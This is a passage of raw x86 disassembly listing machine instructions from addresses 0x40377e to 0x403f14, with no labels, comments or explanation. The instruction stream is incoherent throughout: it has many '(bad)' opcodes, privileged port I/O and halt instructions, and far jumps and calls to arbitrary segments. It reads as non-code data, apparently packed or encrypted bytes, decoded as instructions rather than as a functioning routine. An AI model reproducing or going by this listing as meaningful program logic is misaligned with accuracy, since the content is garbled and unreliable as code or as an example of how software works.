  40377e:	sbb    DWORD PTR [edx+0x33],eax
  403781:	lods   al,BYTE PTR ds:[esi]
  403782:	popa   
  403783:	mov    dh,0xd7
  403785:	out    dx,al
  403786:	lock clc 
  403788:	dec    ebx
  403789:	and    BYTE PTR [edx],ch
  40378b:	rol    dh,cl
  40378d:	imul   ecx,eax,0x2e
  403790:	pop    edi
  403791:	outs   dx,DWORD PTR ds:[esi]
  403792:	push   ebp
  403793:	push   edi
  403794:	inc    BYTE PTR [ecx+0x4]
  403797:	jmp    0x40375b
  403799:	(bad)  
  40379a:	stc    
  40379b:	in     al,0x21
  40379d:	push   es
  40379e:	cmp    al,0x37
  4037a0:	adc    DWORD PTR [eax-0x4255ec18],ebp
  4037a6:	fild   WORD PTR [esp+edx*1+0x4b]
  4037aa:	and    BYTE PTR [ecx+0x52],0x67
  4037ae:	sbb    ebx,DWORD PTR [eax]
  4037b0:	jbe    0x403743
  4037b2:	dec    edi
  4037b3:	sub    esp,ebp
  4037b5:	rep ins BYTE PTR es:[edi],dx
  4037b7:	and    cl,BYTE PTR [esi+0xd221112]
  4037bd:	jl     0x4037ca
  4037bf:	inc    ebp
  4037c0:	inc    ebx
  4037c1:	outs   dx,BYTE PTR ds:[esi]
  4037c2:	jmp    0x18342725
  4037c7:	pop    ds
  4037c8:	fs xor ebx,eax
  4037cb:	in     eax,0x33
  4037cd:	xchg   ebx,eax
  4037ce:	mov    ah,0xb9
  4037d1:	sti    
  4037d2:	out    dx,al
  4037d3:	mov    eax,ds:0x95601ff4
  4037d8:	(bad)
  4037db:	pop    DWORD PTR [edx-0x6bbf95c0]
  4037e1:	mov    ebp,0x94edacd0
  4037e6:	and    al,0x6d
  4037e8:	xor    edi,DWORD PTR [ecx-0x3a]
  4037eb:	adc    cl,BYTE PTR [eax+0x3357ac47]
  4037f1:	dec    ecx
  4037f2:	imul   edi,eax,0xffffffc4
  4037f5:	mov    dl,0x62
  4037f7:	push   edx
  4037f8:	push   es
  4037f9:	xor    eax,0x551822d0
  4037fe:	push   0xf
  403800:	mov    al,0x3c
  403802:	aas    
  403803:	xor    DWORD PTR [edx+0x6f],0xf01941b6
  40380a:	push   0xe9984bc7
  40380f:	ins    DWORD PTR es:[edi],dx
  403810:	or     eax,0x82963fb5
  403815:	pushf  
  403816:	pop    ebx
  403817:	(bad)  
  403818:	mov    bl,0xcc
  40381a:	mov    al,0x86
  40381c:	retf   0x21f8
  40381f:	mov    dh,0x83
  403821:	retf   0xee67
  403824:	pop    ecx
  403825:	test   eax,0xb0815294
  40382a:	loope  0x4037fb
  40382c:	cmp    BYTE PTR [esi-0x1c],ch
  40382f:	lock mov ebp,0x278eb058
  403835:	xor    esp,DWORD PTR [eax-0x16]
  403838:	sub    bh,BYTE PTR [esi]
  40383a:	(bad)  
  40383b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40383c:	outs   dx,BYTE PTR ds:[esi]
  40383d:	push   esi
  40383e:	xchg   DWORD PTR [edi+edx*2],ebp
  403841:	aam    0x60
  403843:	loopne 0x4037cd
  403845:	adc    esi,ecx
  403847:	or     DWORD PTR [eax],0x275dff65
  40384d:	cdq    
  40384e:	fiadd  WORD PTR [esi+ebp*1+0x6c]
  403852:	or     al,0x26
  403854:	cmp    eax,0xa6f592a3
  403859:	loope  0x403861
  40385b:	or     DWORD PTR [ebx+0x8],esp
  40385e:	lods   eax,DWORD PTR ds:[esi]
  40385f:	xchg   BYTE PTR [edx],dl
  403861:	repnz xor al,0x1e
  403864:	add    al,BYTE PTR [edi-0x36]
  403867:	shl    BYTE PTR [esi+esi*1-0x2c],cl
  40386b:	outs   dx,BYTE PTR ds:[esi]
  40386c:	dec    ebx
  40386d:	sbb    BYTE PTR [eax],dl
  40386f:	imul   ebx,DWORD PTR [eax],0xaf83c5cc
  403875:	(bad)  
  403876:	fimul  DWORD PTR [ecx+ebp*8]
  403879:	rcl    ebx,1
  40387b:	cmc    
  40387c:	and    edi,DWORD PTR [edi+esi*2+0x60]
  403880:	inc    edx
  403881:	and    al,0xfa
  403883:	dec    edx
  403884:	mov    BYTE PTR [ebx+0x6],cl
  403887:	add    BYTE PTR [eax+0x415326a0],0x45
  40388e:	mov    dl,BYTE PTR [edi]
  403890:	mov    al,0x2
  403892:	dec    ebx
  403893:	loop   0x40384b
  403895:	ins    DWORD PTR es:[edi],dx
  403896:	jb     0x40385d
  403898:	add    edx,ebp
  40389a:	fcmovnu st,st(2)
  40389c:	mov    ah,0xcb
  40389e:	xchg   esp,eax
  40389f:	jbe    0x4038b3
  4038a1:	rcl    ebp,cl
  4038a3:	shr    esp,1
  4038a5:	cdq    
  4038a6:	mov    bh,BYTE PTR [ebx+0x7d]
  4038a9:	cmp    al,0xf2
  4038ab:	mov    dh,0x0
  4038ad:	imul   ebp,ebx,0x132cde8
  4038b3:	call   0xae70ce3e
  4038b8:	test   BYTE PTR [edx-0x4178eadb],0x8
  4038bf:	cmc    
  4038c0:	sti    
  4038c1:	mov    ds:0x8d759985,eax
  4038c6:	jo     0x403858
  4038c8:	imul   ebx
  4038ca:	nop
  4038cb:	adc    al,0x65
  4038cd:	das    
  4038ce:	jbe    0x40385d
  4038d0:	inc    esp
  4038d1:	test   al,0x5d
  4038d3:	dec    ebp
  4038d4:	fwait
  4038d5:	and    esp,DWORD PTR [edx-0x41c27f3b]
  4038db:	adc    eax,0x4b4c0ef7
  4038e0:	das    
  4038e1:	jle    0x4038c7
  4038e3:	push   es
  4038e4:	pop    ebp
  4038e5:	(bad)  
  4038e6:	lock repnz cmp DWORD PTR [edi+0x68dcb00e],ecx
  4038ee:	sbb    dh,bh
  4038f0:	cmc    
  4038f1:	mov    DWORD PTR [eiz*2-0x82c5f51],esi
  4038f8:	fmul   DWORD PTR [ebx+0x51]
  4038fb:	xchg   edx,eax
  4038fc:	dec    ebx
  4038fd:	add    BYTE PTR [ebp+ecx*2-0x7b1b04fd],dl
  403904:	mov    WORD PTR [ebx-0x52],cs
  403907:	mov    esi,0xad7997ac
  40390c:	bound  esp,QWORD PTR [edi+0x1549009e]
  403912:	imul   ebx,esi,0x9
  403915:	pop    edi
  403916:	mov    ch,0xe5
  403918:	mov    edi,0x274bbd6a
  40391d:	mov    ds:0xe4479cff,eax
  403922:	mov    ebp,esi
  403924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403925:	dec    ecx
  403926:	bound  esp,QWORD PTR [eax]
  403928:	ins    BYTE PTR es:[edi],dx
  403929:	or     bl,0xa2
  40392c:	cmc    
  40392d:	or     eax,0x91521037
  403932:	ror    BYTE PTR [esi-0x7a251a83],0x2e
  403939:	adc    ah,dh
  40393b:	(bad)  
  40393c:	pop    ss
  40393d:	sar    eax,0x2b
  403940:	mov    dh,BYTE PTR [edx]
  403942:	(bad)  
  403943:	ficomp DWORD PTR [ebx+edx*2]
  403946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403947:	adc    BYTE PTR [eax],0x42
  40394a:	addr16 sbb ebx,ebx
  40394d:	push   eax
  40394e:	push   ss
  40394f:	clc    
  403950:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403951:	push   ss
  403952:	mov    cl,0x5
  403954:	popa   
  403955:	or     bl,ah
  403957:	or     al,0x32
  403959:	icebp  
  40395a:	inc    edi
  40395b:	mov    BYTE PTR [eax-0x254dbede],bl
  403961:	dec    edi
  403962:	ret    
  403963:	jle    0x4039b8
  403965:	pusha  
  403966:	dec    edi
  403967:	push   es
  403968:	xchg   ebp,eax
  403969:	mov    BYTE PTR [esi-0x4277ee74],0x57
  403970:	xor    BYTE PTR [ecx],ah
  403972:	cmp    eax,0xf1fa6fa8
  403977:	data16 cs loopne 0x403917
  40397b:	or     ah,BYTE PTR [eax]
  40397d:	sub    DWORD PTR ss:[ecx+0x68],ecx
  403981:	out    0x38,al
  403983:	jbe    0x4039b0
  403985:	stc    
  403986:	and    BYTE PTR [ebp+edi*4-0x41],dh
  40398a:	pop    eax
  40398b:	dec    esp
  40398c:	and    edi,DWORD PTR [edi-0x3aadf40a]
  403992:	sbb    ebx,DWORD PTR [edx]
  403994:	stc    
  403995:	cmp    al,0x8b
  403997:	stos   DWORD PTR es:[edi],eax
  403998:	jnp    0x40397b
  40399a:	sbb    esi,DWORD PTR [edi+eax*1]
  40399d:	mov    WORD PTR [edx-0x2],ds
  4039a0:	or     ecx,esi
  4039a2:	in     eax,dx
  4039a3:	push   ebp
  4039a4:	popf   
  4039a5:	mov    bl,0x78
  4039a7:	push   edx
  4039a8:	push   esp
  4039a9:	lahf   
  4039aa:	pop    ebp
  4039ab:	dec    edi
  4039ac:	hlt    
  4039ad:	and    bl,ah
  4039af:	nop
  4039b0:	retf   
  4039b1:	xor    eax,0xeccfad93
  4039b6:	loopne 0x403991
  4039b8:	dec    esi
  4039b9:	lds    edx,FWORD PTR [ebx+0x74]
  4039bc:	xchg   edx,eax
  4039bd:	push   cs
  4039be:	ret    0xf7b1
  4039c1:	fcom   QWORD PTR [edi+0x3f]
  4039c4:	mov    eax,ds:0xe41f59e6
  4039c9:	and    BYTE PTR [edx+0x67],bh
  4039cc:	fwait
  4039cd:	push   0x10
  4039cf:	adc    DWORD PTR [ebx],edi
  4039d1:	shr    BYTE PTR [esi+edi*1-0x34],cl
  4039d5:	loopne 0x4039e5
  4039d7:	xchg   esp,eax
  4039d8:	or     ch,dh
  4039da:	out    dx,al
  4039db:	pop    es
  4039dc:	retf   0xf9f6
  4039df:	xchg   edx,eax
  4039e0:	jp     0x40399e
  4039e2:	(bad)  
  4039e3:	adc    esi,DWORD PTR [ebx+0x64]
  4039e6:	push   ebx
  4039e7:	pop    ebx
  4039e8:	nop    DWORD PTR [edi]
  4039eb:	inc    eax
  4039ec:	push   ebx
  4039ed:	xlat   BYTE PTR ds:[ebx]
  4039ee:	jg     0x403a2d
  4039f0:	mov    BYTE PTR [ebx],dh
  4039f2:	adc    al,0x5
  4039f4:	in     eax,0xc6
  4039f6:	push   edx
  4039f7:	add    al,0x78
  4039f9:	xchg   edx,eax
  4039fa:	fs pop edi
  4039fc:	push   esi
  4039fd:	cmp    eax,0xcfe51929
  403a02:	inc    eax
  403a03:	mov    ds,WORD PTR [ecx]
  403a05:	imul   edx,DWORD PTR [ebx-0xb],0xad25afc0
  403a0c:	dec    ebx
  403a0d:	jne    0x403a14
  403a0f:	mov    dl,0xe9
  403a11:	retf   0x1b2d
  403a14:	dec    edx
  403a15:	adc    eax,0x8874f735
  403a1a:	mov    ah,0xb9
  403a1c:	lock hlt 
  403a1e:	mov    eax,es:0xcc19b3c0
  403a24:	pop    ebp
  403a26:	popf   
  403a27:	or     al,0x8e
  403a29:	out    dx,al
  403a2a:	cmp    eax,0x6a959c5f
  403a2f:	jmp    0x82c1:0x7afb94b1
  403a36:	dec    eax
  403a37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a38:	xlat   BYTE PTR ds:[ebx]
  403a39:	push   cs
  403a3a:	dec    ebp
  403a3b:	adc    edx,eax
  403a3d:	test   al,0xd1
  403a3f:	mov    ebp,0x1f10e895
  403a44:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a46:	fxtract 
  403a48:	push   cs
  403a49:	adc    BYTE PTR [esi],ah
  403a4b:	dec    ecx
  403a4c:	mov    bh,0x64
  403a4e:	cmp    BYTE PTR [edx-0x4b1810ea],ch
  403a54:	xchg   edx,eax
  403a55:	xlat   BYTE PTR ds:[ebx]
  403a56:	mov    al,ds:0x1734783
  403a5b:	or     eax,0x955c531a
  403a60:	sbb    al,0xc5
  403a62:	mov    ecx,DWORD PTR [ecx]
  403a64:	mov    ?,WORD PTR [ecx-0x37]
  403a67:	rcr    BYTE PTR [edi],cl
  403a69:	sti    
  403a6a:	(bad)  
  403a6b:	retf   
  403a6c:	in     eax,dx
  403a6d:	call   0xa02d0c93
  403a72:	cmc    
  403a73:	mov    es,WORD PTR [ecx+0x5]
  403a76:	push   cs
  403a77:	adc    BYTE PTR [eax+eiz*1],ch
  403a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a7b:	loop   0x403a79
  403a7d:	ret    0x83f9
  403a80:	cmp    cl,BYTE PTR [edi]
  403a82:	adc    eax,0xf17258ab
  403a87:	psrad  mm6,QWORD PTR [edx-0x65900631]
  403a8e:	xor    eax,0x13d4854f
  403a93:	loop   0x403a6d
  403a95:	imul   BYTE PTR [ebp+0x3f]
  403a98:	test   edi,esp
  403a9a:	in     al,0x98
  403a9c:	loop   0x403a71
  403a9e:	mov    eax,ds:0xd677d620
  403aa3:	in     eax,0x64
  403aa5:	dec    esi
  403aa6:	mov    esi,0xe74a10e0
  403aab:	ins    BYTE PTR es:[edi],dx
  403aac:	xchg   esi,eax
  403aad:	xor    al,0xfe
  403aaf:	outs   dx,DWORD PTR ds:[esi]
  403ab0:	sub    DWORD PTR [eax],esi
  403ab2:	sub    BYTE PTR [ecx-0x7c2dfa79],0x2
  403ab9:	jg     0x403acc
  403abb:	call   0xfd68b8d6
  403ac0:	mov    DWORD PTR [edi-0x251fdd4f],0x543f4d0
  403aca:	test   BYTE PTR [ebp-0x4d91fe09],dl
  403ad0:	jmp    0x403ad9
  403ad2:	sahf   
  403ad3:	or     eax,0xb0dac4d
  403ad8:	jmp    FWORD PTR [eax-0xe]
  403adb:	mov    esi,0x7bb0b1b3
  403ae0:	loop   0x403ab9
  403ae2:	retf   0x7fe3
  403ae5:	ins    DWORD PTR es:[edi],dx
  403ae6:	mov    ds:0x2eb199c9,eax
  403aeb:	xchg   ebp,eax
  403aec:	mov    dl,0xf1
  403aee:	fadd   DWORD PTR [eax-0x80]
  403af1:	mov    esp,0x4a3d8001
  403af6:	xchg   ecx,eax
  403af7:	neg    DWORD PTR [eax]
  403af9:	jmp    0x64720e17
  403afe:	inc    ecx
  403aff:	ja     0x403af8
  403b01:	xor    ebp,esi
  403b03:	and    DWORD PTR [ebx],0xffffff89
  403b06:	sbb    DWORD PTR [ecx-0x12fde88e],edx
  403b0c:	add    al,BYTE PTR [edx]
  403b0e:	mov    cs,WORD PTR [eax+0x2f375203]
  403b14:	fisub  DWORD PTR [ebp-0x8]
  403b17:	iret   
  403b18:	lock frstor ds:0x33463334
  403b1f:	cmp    eax,0xf078002a
  403b24:	test   DWORD PTR [esi+0x2a],edx
  403b27:	sub    al,0x68
  403b29:	adc    BYTE PTR [ebx-0x6f],al
  403b2c:	push   ebp
  403b2d:	mov    es,WORD PTR [edx]
  403b2f:	popa   
  403b30:	dec    ebx
  403b31:	cwde   
  403b32:	xchg   esi,eax
  403b33:	mov    WORD PTR [esi+eax*8-0x1726b551],ss
  403b3a:	xchg   ebx,eax
  403b3b:	adc    eax,0x3b744b6a
  403b40:	mov    edi,0x327c588f
  403b45:	cwde   
  403b46:	popa   
  403b47:	cwde   
  403b48:	xchg   ebx,eax
  403b49:	push   cs
  403b4a:	fwait
  403b4b:	std    
  403b4c:	aam    0x53
  403b4e:	xor    edi,DWORD PTR [eax-0x1d]
  403b51:	popa   
  403b52:	mov    eax,ds:0x18c6e588
  403b57:	pusha  
  403b58:	ret    0xaf4
  403b5b:	pusha  
  403b5c:	mov    ds:0x2016f2ef,al
  403b61:	out    dx,eax
  403b62:	inc    ebp
  403b63:	out    0xb2,eax
  403b65:	out    dx,al
  403b66:	scas   al,BYTE PTR es:[edi]
  403b67:	enter  0x1c0,0x3c
  403b6b:	out    dx,al
  403b6c:	or     ebx,DWORD PTR [esi+edx*4]
  403b6f:	inc    edi
  403b70:	jmp    0x403bd3
  403b72:	xchg   edx,eax
  403b73:	pop    ebx
  403b74:	mov    bh,0xed
  403b76:	dec    esi
  403b77:	ds clc 
  403b79:	je     0x403aff
  403b7b:	mov    al,BYTE PTR [ebx]
  403b7d:	or     ebx,DWORD PTR [ecx]
  403b7f:	out    dx,eax
  403b80:	xchg   esp,eax
  403b81:	shr    BYTE PTR [ebx],cl
  403b83:	pop    edi
  403b84:	jp     0x403b55
  403b86:	xor    ecx,edi
  403b88:	pop    ebx
  403b89:	pushf  
  403b8a:	jge    0x403bbd
  403b8c:	sub    BYTE PTR [ebp+ebx*8+0x3e2c857],ch
  403b93:	inc    ebp
  403b94:	adc    ebx,eax
  403b96:	rol    esp,1
  403b98:	loop   0x403be7
  403b9a:	xchg   edi,eax
  403b9b:	jg     0x403b43
  403b9d:	pop    ebx
  403b9e:	xor    dl,BYTE PTR [eax]
  403ba0:	cs loop 0x403b84
  403ba3:	push   esi
  403ba4:	push   ebx
  403ba5:	aas    
  403ba6:	xor    BYTE PTR [ebp+0x32a57327],ah
  403bac:	and    BYTE PTR [ebx-0x5a],dh
  403baf:	xor    bh,BYTE PTR [edx]
  403bb1:	clc    
  403bb2:	xor    DWORD PTR [esi+0xdf4b844],0x3f
  403bb9:	sti    
  403bba:	xor    al,ch
  403bbc:	pop    bp
  403bbe:	jmp    0x403b65
  403bc0:	or     eax,0x73afa64d
  403bc5:	mov    bl,0x44
  403bc7:	mov    esi,0x9f9103f7
  403bcc:	pop    eax
  403bcd:	jl     0x403c42
  403bcf:	xor    DWORD PTR [edi+0x9e92097],edi
  403bd5:	int3   
  403bd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bd7:	and    eax,0x9b4784d3
  403bdc:	adc    al,0xcd
  403bde:	call   0xc6af26d1
  403be3:	loop   0x403c26
  403be5:	gs mov ch,0xef
  403be8:	iret   
  403be9:	mov    al,ds:0x5579acd4
  403bee:	call   FWORD PTR [eax+eiz*4+0x10]
  403bf2:	retf   
  403bf3:	push   0x24e1f6c7
  403bf8:	iret   
  403bf9:	bound  ecx,QWORD PTR [ebx+0x16]
  403bfc:	fwait
  403bfd:	icebp  
  403bfe:	scas   eax,DWORD PTR es:[edi]
  403bff:	xchg   DWORD PTR [eax+edx*1+0x24],ebx
  403c03:	cld    
  403c04:	je     0x403bf1
  403c06:	sbb    ecx,DWORD PTR [ecx]
  403c08:	pop    ebx
  403c09:	out    0x42,eax
  403c0b:	pop    ebp
  403c0c:	cli    
  403c0d:	cmp    esi,DWORD PTR [edx+eiz*2+0x2a75f4d5]
  403c14:	test   eax,0xf0aa7bf1
  403c19:	adc    BYTE PTR [ecx-0x62],cl
  403c1c:	sub    BYTE PTR [ebp+0x743011cc],ah
  403c22:	xor    al,0xbd
  403c24:	dec    edi
  403c25:	or     DWORD PTR [ebx+eiz*4+0x49],edi
  403c29:	pop    es
  403c2a:	mov    bl,BYTE PTR [esi-0x1f]
  403c2d:	xchg   edx,eax
  403c2e:	inc    ecx
  403c2f:	sub    cl,ah
  403c31:	or     eax,0xb746e14e
  403c36:	mov    esp,0x9cb81724
  403c3b:	pop    esp
  403c3c:	out    0xed,eax
  403c3e:	mov    cl,0xf2
  403c40:	or     esi,DWORD PTR [eax+eax*2]
  403c43:	fisttp QWORD PTR [ecx+0x3cbd7547]
  403c49:	mov    al,ds:0x94d001bb
  403c4e:	std    
  403c4f:	out    0x29,eax
  403c51:	fnsave [eax+0x4dc2d364]
  403c57:	xchg   ecx,eax
  403c58:	rcr    DWORD PTR [edx-0x55],1
  403c5b:	ds mov esi,0xc78e5b71
  403c61:	push   cs
  403c62:	ret    0x5b81
  403c65:	fiadd  WORD PTR [esi]
  403c67:	call   0x4c96:0xd512fbdf
  403c6e:	jmp    0x35fc:0xda5fbaa5
  403c75:	call   0xfd19:0xfa0c458a
  403c7c:	pop    es
  403c7d:	inc    esp
  403c7e:	lahf   
  403c7f:	std    
  403c80:	popa   
  403c81:	jl     0x403c74
  403c83:	xchg   ebx,eax
  403c84:	mov    bh,0x4a
  403c86:	lds    esi,FWORD PTR [esp+ecx*1-0x4e018ed2]
  403c8d:	push   esi
  403c8e:	cld    
  403c8f:	rcr    DWORD PTR [edi],0xb8
  403c92:	dec    ebx
  403c93:	jg     0x403cbf
  403c95:	in     eax,dx
  403c96:	inc    edx
  403c97:	and    eax,0x5603f214
  403c9c:	sbb    eax,0xeea634e
  403ca1:	lock inc eax
  403ca3:	lods   al,BYTE PTR ds:[esi]
  403ca4:	ficomp DWORD PTR [edx]
  403ca6:	das    
  403ca7:	jns    0x403c60
  403ca9:	fimul  DWORD PTR [ebx+0x1fdd85de]
  403caf:	outs   dx,DWORD PTR ds:[esi]
  403cb0:	scas   eax,DWORD PTR es:[edi]
  403cb1:	mov    dh,0x3a
  403cb3:	or     BYTE PTR fs:[eax+edi*4+0x17],ch
  403cb8:	push   0x1b6bba92
  403cbd:	sub    ebp,ebp
  403cbf:	iret   
  403cc0:	push   ebp
  403cc1:	test   BYTE PTR [eiz*1-0xc89e455],ch
  403cc8:	and    esi,ebx
  403cca:	fldenv [edx-0x56bef266]
  403cd0:	inc    edx
  403cd1:	mov    eax,ds:0xa56f4e3
  403cd6:	or     bl,BYTE PTR [ebx-0x7ca19d5]
  403cdc:	and    ebx,esi
  403cde:	lods   eax,DWORD PTR ds:[esi]
  403cdf:	xchg   edi,eax
  403ce0:	in     eax,0xe3
  403ce2:	ret    
  403ce3:	xchg   ebp,ecx
  403ce5:	jne    0x403c84
  403ce7:	cmp    eax,0x7588372c
  403cec:	push   eax
  403ced:	jmp    0x1b3c:0xc6589c70
  403cf4:	xchg   ebx,eax
  403cf5:	mov    edi,0x5c3abcf
  403cfa:	sub    BYTE PTR [edx-0x7d74c303],bh
  403d00:	xchg   ebp,eax
  403d01:	enter  0x2dd8,0x81
  403d05:	in     al,dx
  403d06:	out    dx,al
  403d07:	loop   0x403d4d
  403d09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d0a:	push   ss
  403d0b:	dec    esi
  403d0c:	inc    esp
  403d0d:	scas   eax,DWORD PTR es:[edi]
  403d0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d0f:	mov    dl,0x94
  403d11:	out    0x22,eax
  403d13:	imul   ecx,edi,0x7d
  403d16:	mov    DWORD PTR [esi+0x6c9400f9],eax
  403d1c:	ss hlt 
  403d1e:	add    DWORD PTR [edx-0xe],ecx
  403d21:	adc    eax,0x2fd96f70
  403d26:	pop    edi
  403d27:	fwait
  403d28:	push   edi
  403d29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d2a:	push   0xffffffee
  403d2c:	icebp  
  403d2d:	cwde   
  403d2e:	scas   eax,DWORD PTR es:[edi]
  403d2f:	aam    0x40
  403d31:	adc    eax,0x49758d90
  403d36:	ret    0x926c
  403d39:	test   DWORD PTR [edi-0x2d],ecx
  403d3c:	popf   
  403d3d:	test   al,ah
  403d3f:	daa    
  403d40:	xlat   BYTE PTR ds:[ebx]
  403d41:	or     dh,ah
  403d43:	mov    dl,0xca
  403d45:	je     0x403d76
  403d47:	inc    ecx
  403d48:	pop    edx
  403d49:	test   al,0xd9
  403d4b:	xchg   ebp,eax
  403d4c:	data16 and dl,BYTE PTR [ecx+eax*2-0x4571be2b]
  403d54:	fcom   st(6)
  403d56:	mov    cl,0xb9
  403d58:	pop    esi
  403d59:	sbb    ebp,DWORD PTR [esi-0x1f]
  403d5c:	cmp    BYTE PTR [edx+0x2],dh
  403d5f:	cs xor al,0x39
  403d62:	imul   eax,edi,0xffffffee
  403d65:	adc    eax,0xe900ad8e
  403d6a:	repnz mov ch,BYTE PTR [ebp-0x66]
  403d6e:	mov    ah,0xc1
  403d70:	loope  0x403dd7
  403d72:	and    dh,BYTE PTR [eax+eiz*4]
  403d75:	jns    0x403d92
  403d77:	ss sbb al,0x62
  403d7a:	hlt    
  403d7b:	call   0x42d1:0x988b3e75
  403d82:	inc    edi
  403d83:	xchg   ebx,eax
  403d84:	les    edi,FWORD PTR [edx+eiz*8]
  403d87:	addr16 push cs
  403d89:	push   edi
  403d8a:	repz sub eax,0x6e33ba92
  403d90:	or     al,0x49
  403d92:	leave  
  403d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d94:	ror    BYTE PTR [ebx+0x14],1
  403d97:	int    0x72
  403d99:	adc    al,0xf8
  403d9b:	jmp    0x3192a47
  403da0:	shr    ah,0x43
  403da3:	sbb    al,0xbd
  403da5:	in     al,dx
  403da6:	ds push cs
  403da8:	neg    ebx
  403daa:	inc    esi
  403dab:	ror    DWORD PTR [edx],1
  403dad:	mov    ebx,0x902d4e41
  403db2:	dec    esi
  403db3:	(bad)  
  403db4:	and    ebp,DWORD PTR [edi]
  403db6:	sub    al,0x32
  403db8:	cli    
  403db9:	or     eax,0xa26cc0d5
  403dbe:	mov    al,ds:0xbfad4cde
  403dc3:	adc    ebp,DWORD PTR [edi+0x4cec9354]
  403dc9:	xor    bl,al
  403dcb:	inc    edi
  403dcc:	push   esi
  403dcd:	je     0x403d5f
  403dcf:	sbb    al,0x1b
  403dd1:	xor    BYTE PTR [ebp+esi*2+0x24],cl
  403dd5:	mov    DWORD PTR [eax+0x62],edx
  403dd8:	pushf  
  403dd9:	jns    0x403d96
  403ddb:	add    eax,0x1c18d4cf
  403de0:	daa    
  403de1:	mov    bl,0x20
  403de3:	push   ebp
  403de4:	lea    esi,[edi+edx*8-0x6e]
  403de8:	lock int 0x76
  403deb:	pop    edi
  403dec:	mov    ecx,0x8f525b0e
  403df1:	add    BYTE PTR [ebx+0x2833870e],ah
  403df7:	std    
  403df8:	or     eax,0xd20c39ef
  403dfd:	es pop eax
  403dff:	fmul   QWORD PTR [eax+0x6f]
  403e02:	rep outs dx,BYTE PTR ds:[esi]
  403e04:	jns    0x403e6f
  403e06:	add    dh,dh
  403e08:	xor    esi,ebp
  403e0a:	pop    ds
  403e0b:	mov    bl,0xa
  403e0d:	mov    ah,0x36
  403e0f:	sub    eax,0x9560a01a
  403e14:	inc    edx
  403e15:	dec    ax
  403e17:	and    DWORD PTR [eax],esi
  403e19:	pop    ds
  403e1a:	cmp    BYTE PTR [ecx+ebp*1-0x6641aefb],0x78
  403e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e24:	dec    ebp
  403e25:	dec    ecx
  403e26:	frstpm(287 only) 
  403e28:	jb     0x403e97
  403e2a:	out    0xe0,al
  403e2c:	fisttp DWORD PTR [edi]
  403e2e:	adc    eax,0x46408482
  403e33:	sub    ecx,DWORD PTR [esi-0x6220e630]
  403e39:	mov    ah,0xc
  403e3b:	jmp    0xa83e8a9b
  403e40:	xchg   ebp,eax
  403e41:	and    ah,BYTE PTR [edx+0x60]
  403e44:	dec    edi
  403e45:	sahf   
  403e46:	lds    esi,FWORD PTR [ebx-0x60]
  403e49:	mov    BYTE PTR [ecx+0x59],bh
  403e4c:	mov    eax,0xe1dc8871
  403e51:	in     al,0xa5
  403e53:	in     eax,dx
  403e54:	mov    WORD PTR [eax],ds
  403e56:	sbb    cl,BYTE PTR [eax+0x612d4009]
  403e5c:	inc    esp
  403e5d:	mov    bl,0x6f
  403e5f:	popa   
  403e60:	pop    esi
  403e61:	(bad)  
  403e62:	xchg   edx,eax
  403e63:	fdiv   QWORD PTR [edx+0x5f9e8ff6]
  403e69:	ins    DWORD PTR es:[edi],dx
  403e6a:	pop    esi
  403e6b:	jmp    0x2cb9:0x1dacbf25
  403e72:	xchg   edi,eax
  403e73:	xchg   edi,eax
  403e74:	or     ebx,DWORD PTR [ebp-0x22d74494]
  403e7a:	cmc    
  403e7b:	and    BYTE PTR [ebp+eiz*8-0x27],al
  403e7f:	pop    ebp
  403e80:	jl     0x403e69
  403e82:	jp     0x403e22
  403e84:	jns    0x403e27
  403e86:	xchg   ecx,eax
  403e87:	scas   al,BYTE PTR es:[edi]
  403e88:	in     eax,0x51
  403e8a:	and    eax,0xe8b317f
  403e8f:	pop    ecx
  403e90:	or     cl,bh
  403e92:	and    al,0xcd
  403e94:	lock std 
  403e96:	hlt    
  403e97:	push   cs
  403e98:	loopne 0x403e6e
  403e9a:	push   edx
  403e9b:	xchg   edi,eax
  403e9c:	lahf   
  403e9d:	ret    
  403e9e:	dec    ebp
  403e9f:	lea    ecx,[esi+0x529668e0]
  403ea5:	push   ecx
  403ea6:	fs jne 0x403e3c
  403ea9:	test   eax,0xc7d178cd
  403eae:	xchg   ebx,eax
  403eaf:	pusha  
  403eb0:	mov    eax,0xbec37edd
  403eb5:	stos   BYTE PTR es:[edi],al
  403eb6:	mov    ?,WORD PTR [ecx]
  403eb8:	ror    DWORD PTR [eax-0x483a5f9c],cl
  403ebe:	retf   0x1d6f
  403ec1:	and    al,0x21
  403ec3:	jmp    0xcf07bbfc
  403ec8:	pop    eax
  403ec9:	loop   0x403ebd
  403ecb:	and    al,dl
  403ecd:	xor    esi,esp
  403ecf:	out    dx,eax
  403ed0:	or     eax,0x3883374d
  403ed5:	sbb    cl,BYTE PTR [edi+0x695dd2f5]
  403edb:	sbb    DWORD PTR [eax+0x3c],edi
  403ede:	inc    esp
  403edf:	test   al,0x33
  403ee1:	addr16 in al,dx
  403ee3:	loope  0x403e6f
  403ee5:	xchg   DWORD PTR [esi-0x15],edx
  403ee8:	xchg   edx,eax
  403ee9:	jg     0x403f2c
  403eeb:	(bad)  
  403eec:	xor    al,BYTE PTR [edx]
  403eee:	cdq    
  403eef:	repz ret 
  403ef1:	(bad)  
  403ef3:	push   ds
  403ef4:	pop    ds
  403ef5:	rcr    ecx,cl
  403ef7:	or     eax,DWORD PTR [ebp-0x38]
  403efa:	mov    ebx,0xb05c3877
  403eff:	inc    eax
  403f00:	outs   dx,DWORD PTR ds:[esi]
  403f01:	push   0xa83c8048
  403f06:	dec    edi
  403f07:	sbb    eax,0x5183b7b1
  403f0c:	dec    edx
  403f0d:	push   0x7d
  403f0f:	add    eax,0x2652ce6a
  403f14:	sub    BYTE PTR [esi*1-0x633e3843],al
